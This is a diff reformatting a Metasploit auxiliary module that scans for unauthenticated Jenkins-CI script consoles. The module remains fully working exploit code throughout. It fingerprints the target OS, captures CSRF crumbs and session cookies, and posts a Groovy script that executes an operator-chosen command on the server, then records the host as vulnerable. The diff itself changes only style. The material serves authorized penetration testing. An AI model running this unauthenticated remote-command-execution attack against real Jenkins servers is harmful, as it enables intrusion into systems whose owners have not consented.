@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'cgi'
 
 class MetasploitModule < Msf::Auxiliary
@@ -12,45 +11,47 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Jenkins-CI Unauthenticated Script-Console Scanner',
-      'Description' => %q{
-        This module scans for unauthenticated Jenkins-CI script consoles and
-        executes the specified command.
-      },
-      'Author'      =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Jenkins-CI Unauthenticated Script-Console Scanner',
+        'Description' => %q{
+          This module scans for unauthenticated Jenkins-CI script consoles and
+          executes the specified command.
+        },
+        'Author' => [
           'altonjx',
           'Jeffrey Cap'
         ],
-      'References'  =>
-        [
+        'References' => [
           ['CVE', '2015-8103'], # see link and validate, https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/ states this is another issue
           ['URL', 'https://www.jenkins.io/security/advisory/2015-11-11/'],
           ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/'],
           ['URL', 'https://www.jenkins.io/doc/book/managing/script-console/'],
         ],
-      'License'     => MSF_LICENSE
-      ))
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [ true, 'The path to the Jenkins-CI application', '/jenkins/' ]),
         OptString.new('COMMAND', [ true, 'Command to run in application', 'whoami' ]),
-      ])
+      ]
+    )
   end
 
-  def fingerprint_os(ip)
-    res = send_request_cgi({'uri' => normalize_uri(target_uri.path,"systemInfo")})
+  def fingerprint_os(_ip)
+    res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, 'systemInfo') })
 
     # Verify that we received a proper systemInfo response
-    unless res && res.body.to_s.length > 0
+    unless res && !res.body.to_s.empty?
       vprint_error("#{peer} - The server did not reply to our systemInfo request")
       return
     end
 
-    unless res.body.index("System Properties") &&
-           res.body.index("Environment Variables")
+    unless res.body.index('System Properties') &&
+           res.body.index('Environment Variables')
       if res.body.index('Remember me on this computer')
         vprint_error("#{peer} This Jenkins-CI system requires authentication")
       else
@@ -61,29 +62,30 @@ class MetasploitModule < Msf::Auxiliary
 
     host_info = {}
     if (res.body =~ /"\.crumb", "([a-z0-9]*)"/)
-      print_status("#{peer} Using CSRF token: '#{$1}'")
-      host_info[:crumb] = $1
+      print_status("#{peer} Using CSRF token: '#{::Regexp.last_match(1)}'")
+      host_info[:crumb] = ::Regexp.last_match(1)
 
       sessionid = 'JSESSIONID' << res.get_cookies.split('JSESSIONID')[1].split('; ')[0]
-      host_info[:cookie] = "#{sessionid}"
+      host_info[:cookie] = sessionid.to_s
     end
 
     os_info = pattern_extract(/os.name(.*?)os.version/m, res.body).first
-    host_info[:prefix] = os_info.index(">Windows") ? "cmd.exe /c " : ""
+    host_info[:prefix] = os_info.index('>Windows') ? 'cmd.exe /c ' : ''
     host_info
   end
 
   def run_host(ip)
-    command = datastore['COMMAND'].gsub("\\", "\\\\\\")
+    command = datastore['COMMAND'].gsub('\\', '\\\\\\')
 
     host_info = fingerprint_os(ip)
     return if host_info.nil?
+
     prefix = host_info[:prefix]
 
     request_parameters = {
-      'uri'       => normalize_uri(target_uri.path,"script"),
-      'method'    => 'POST',
-      'ctype'     => 'application/x-www-form-urlencoded',
+      'uri' => normalize_uri(target_uri.path, 'script'),
+      'method' => 'POST',
+      'ctype' => 'application/x-www-form-urlencoded',
       'vars_post' =>
         {
           'script' => "def sout = new StringBuffer(), serr = new StringBuffer()\r\ndef proc = '#{prefix} #{command}'.execute()\r\nproc.consumeProcessOutput(sout, serr)\r\nproc.waitForOrKill(1000)\r\nprintln \"out> $sout err> $serr\"\r\n",
@@ -94,12 +96,12 @@ class MetasploitModule < Msf::Auxiliary
     request_parameters['vars_post']['.crumb'] = host_info[:crumb] unless host_info[:crumb].nil?
     res = send_request_cgi(request_parameters)
 
-    unless res && res.body.to_s.length > 0
+    unless res && !res.body.to_s.empty?
       vprint_error("#{peer} No response received from the server.")
       return
     end
 
-    plugin_output, command_output = pattern_extract(/<pre>(.*?)<\/pre>/m, res.body.to_s)
+    plugin_output, command_output = pattern_extract(%r{<pre>(.*?)</pre>}m, res.body.to_s)
 
     if plugin_output !~ /Jenkins\.instance\.pluginManager\.plugins/
       vprint_error("#{peer} The server returned an invalid response.")
@@ -107,12 +109,12 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # The output is double-HTML encoded
-    output = CGI.unescapeHTML(CGI.unescapeHTML(command_output.to_s)).
-             gsub(/\s*(out|err)>\s*/m, '').
-             strip
+    output = CGI.unescapeHTML(CGI.unescapeHTML(command_output.to_s))
+                .gsub(/\s*(out|err)>\s*/m, '')
+                .strip
 
-    if output =~ /^java\.[a-zA-Z\.]+\:\s*([^\n]+)\n/
-      output = $1
+    if output =~ /^java\.[a-zA-Z.]+:\s*([^\n]+)\n/
+      output = ::Regexp.last_match(1)
       print_good("#{peer} The server is vulnerable, but the command failed: #{output}")
     else
       output.split("\n").each do |line|
@@ -121,23 +123,22 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     report_vulnerable(output)
-
   end
 
   def pattern_extract(pattern, buffer)
-    buffer.to_s.scan(pattern).map{ |m| m.first }
+    buffer.to_s.scan(pattern).map(&:first)
   end
 
   def report_vulnerable(result)
     report_vuln(
-      :host   => rhost,
-      :port   => rport,
-      :proto  => 'tcp',
-      :sname  => ssl ? 'https' : 'http',
-      :name   => self.name,
-      :info   => result,
-      :refs   => self.references,
-      :exploited_at => Time.now.utc
+      host: rhost,
+      port: rport,
+      proto: 'tcp',
+      sname: ssl ? 'https' : 'http',
+      name: name,
+      info: result,
+      refs: references,
+      exploited_at: Time.now.utc
     )
   end
 end
